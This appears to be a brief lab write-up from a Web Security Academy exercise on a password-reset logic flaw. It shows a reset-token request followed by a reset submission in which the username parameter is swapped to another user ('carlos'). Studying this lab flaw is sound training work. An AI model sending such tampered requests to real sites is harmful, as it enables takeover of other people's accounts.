### First request:
```
POST /forgot-password HTTP/2

username=wiener
```
Which generates a temp password reset token and sends it to the user email e.g.:
```
https://web-security-academy.net/forgot-password?temp-forgot-password-token=1qr7bgujzvib1tiw4gk8bm3pw819prqh
```
When clicked on the link we're given back an html that has a reset password form with 2 fields (`new pass` and `confirm new pass`) which fires the second request (when submitted)

### Second request:
```
POST /forgot-password?temp-forgot-password-token=huxw7kzj13w4v79pfgnvg1dnmnmboiky HTTP/2

temp-forgot-password-token=huxw7kzj13w4v79pfgnvg1dnmnmboiky&username=carlos&new-password-1=vvv&new-password-2=vvv
```
